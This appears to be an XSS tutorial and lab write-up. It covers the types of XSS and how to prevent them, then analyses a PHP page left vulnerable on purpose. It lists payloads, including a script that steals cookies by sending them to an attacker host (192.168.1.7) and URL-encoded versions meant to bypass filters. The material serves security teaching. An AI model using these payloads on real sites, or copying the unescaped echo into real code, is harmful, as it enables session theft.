
# Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** remains one of the most critical web security risks. It allows attackers to inject malicious scripts into trusted websites, causing visitors’ browsers to execute this untrusted code. This can lead to anything from **credential theft** to full system compromise.

### How XSS Works

- **Untrusted Data Input:** XSS occurs when user-supplied data is embedded in web pages without adequate validation or sanitization.
- **Script Execution:** Attackers typically inject **JavaScript** (but can use any browser-supported language), which executes whenever another user visits the maliciously crafted page or link, running in the context of the target site.

### Types of XSS Attacks
 
- **Reflected XSS:** The payload is reflected off a web server, usually via URL parameters, and executed immediately in the victim’s browser.
- **Stored (Persistent) XSS:** The payload is stored on the server (e.g., in a database) and then delivered to and executed by each user who views the affected content.
- **DOM-based XSS:** The vulnerability is in client-side JavaScript code; the malicious changes happen when the DOM is insecurely manipulated, possibly without ever reaching the server.

### Risks and Impact

- **Theft of authentication cookies, session tokens, or sensitive user data.**
- **User impersonation, keylogging, phishing, or malware installation.**
- **Content modification:** including website defacement or redirecting users to malicious sites.
- **Prevalence:** XSS’s occurrence has increased alongside more dynamic, JavaScript-driven web applications.
- **Severe impact:** If an admin account is compromised, XSS can enable attackers to take over the entire application or system.

### XSS Prevention Best Practices

- **Sanitize and Encode Inputs:** Always handle user input as untrusted. Encode all output according to context (HTML, JavaScript, CSS, URL, etc.).
- **Use Secure Frameworks or Libraries:** Utilize frameworks that automatically apply appropriate output encoding and help mitigate XSS risks.
- **Content Security Policy (CSP):** Implement strict CSP headers to prevent inline and unauthorized scripts. Example:

  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
  ```

- **Regular Testing and Code Review:** Use security scanning tools (e.g., Burp Suite, OWASP ZAP) and conduct frequent code reviews to identify vulnerabilities.
- **Keep Dependencies Updated:** Many XSS incidents in 2025 still result from outdated third-party libraries or components. Regularly apply patches and updates.

**Proper prevention and vigilance are essential. If you need practical code examples or want to understand specific techniques (like CSP implementation or secure templating), just let me know!**


---

# XSS-Vulnerable-Code-Analysis

**Cross-Site Scripting (XSS) Code Analysis and XSS Issue**
**Vulnerable Example:** `xss-1.php`
```php
xss-1.php
```
```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>XSS Vulnerability Lab</title>
</head>
<body>
<h1>Welcome To Armour Infosec</h1>

<?php
// Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
if (isset($_REQUEST['user'])) {
    echo $_REQUEST['user'] . "!!";
}
?>

<p>Try injecting JavaScript or HTML code into the ‘user’ parameter in the URL to test reflected XSS:</p>
<pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

</body>
</html>
```

---

## Code Analysis and XSS Issue

The PHP code you provided is intentionally written to be vulnerable, which makes it a perfect candidate for demonstrating reflected Cross-Site Scripting (XSS) for educational and lab purposes. Here's an analysis:

### Key Code

```php
if (isset($_REQUEST['user'])) {
    echo $_REQUEST['user'] . "!!";
}
```

---

## Vulnerability Explanation

* Direct Output of User Input:
  The core problem is that the code takes whatever is given in the `user` parameter (via GET, POST, or COOKIE), and directly outputs it to the web page without any form of sanitization, escaping, or validation.

* Result:
  If a user supplies a malicious payload—such as `<script>alert('XSS')</script>`—as the value of `user`, that JavaScript will be rendered and executed in the browser of anyone visiting that URL.

### Example:

```
http://yourlab.com/page.php?user=<script>alert('XSS')</script>
```

> This would cause a browser popup when that page is loaded.

---

## What Makes This Reflected XSS?

* The malicious payload is immediately “reflected” back in the HTTP response, rather than being stored on the server for later.
* The vulnerable code is using `$_REQUEST`, which combines GET, POST, and COOKIE variables, expanding the attack surface.
* Script Execution:
  Any visitor who clicks a crafted link or submits a manipulated form could have arbitrary JavaScript executed in their browser in the context of the vulnerable site.
* Cookie Theft:
  Attackers could use scripts to steal session cookies, hijack logins, or impersonate users.
* Session Security:
  The presence of `admin` cookies and session variables further increases attack value—they could be targeted for theft or manipulation.

---

## Common XSS Exploits (for Lab Purposes)

### 1. Basic Alert Payloads

* `alert(123);` — Displays a numeric popup alert.

```html
<script>alert(123);</script>
```

* `alert("Armour");` — Displays a popup with the text “Armour”.

```html
<script>alert("Armour");</script>
```

* `alert(document.domain);` — Shows the domain of the current document (used to confirm the site context).

```html
<script>alert(document.domain);</script>
```

* `alert(document.cookie);` — Displays the user's cookies stored for the site.

```html
<script>alert(document.cookie);</script>
```

> These are JavaScript alert popups enclosed in `<script>` tags.

> They are commonly used to test if XSS vulnerabilities exist by triggering a popup.

---

### 2. Cookie Theft via Image Request

```html
<script>
var i = new Image;
i.src = "http://192.168.1.7/?" + document.cookie;
</script>
```

* Creates a new JavaScript Image object without adding it to the page.
* Sets the image’s `src` attribute to a URL controlled by the attacker (`http://192.168.1.7/`), appending the victim’s cookie as a query parameter.
* When the browser tries to load this image, it sends the victim's cookies to the attacker's server—stealing session cookies or authentication tokens.

---

### 3. URL-Encoded Versions of the Above Payloads

```html
%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D'http%3A//192.168.1.7/?'%2Bdocument.cookie%3B%3C/script%3E
%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D'http%3A//192.168.1.6/?'%2Bdocument.cookie%3B%3C/script%3E
```

* These are the URL-encoded versions of the image-based cookie theft payload.
* URL encoding is used to safely transmit special characters in URLs without breaking web requests or filters.
* When decoded, they become the same JavaScript payload as before.
* Attackers use URL-encoding to bypass input filters or WAFs that don't decode inputs before inspection.

---

### Payload Reference Table

| Payload                                                                            | Purpose                                          |
| ---------------------------------------------------------------------------------- | ------------------------------------------------ |
| `<script>alert(...);</script>`                                                     | Proof of XSS vulnerability (shows popup alert)   |
| `<script>alert(document.cookie);</script>`                                         | Test access to victim’s cookies                  |
| `<script>var i=new Image(); i.src="http://attacker/?" + document.cookie;</script>` | Steal cookies via HTTP request                   |
| `%3Cscript%3E...%3C/script%3E`                                                     | Encoded payload for bypassing input restrictions |

---

## Why Leave It Vulnerable?

For XSS labs and training, seeing raw, unsanitized output is essential for demonstrating the impact and exploitability of these attacks. It provides hands-on experience for attacking and later learning to defend real web applications.

---

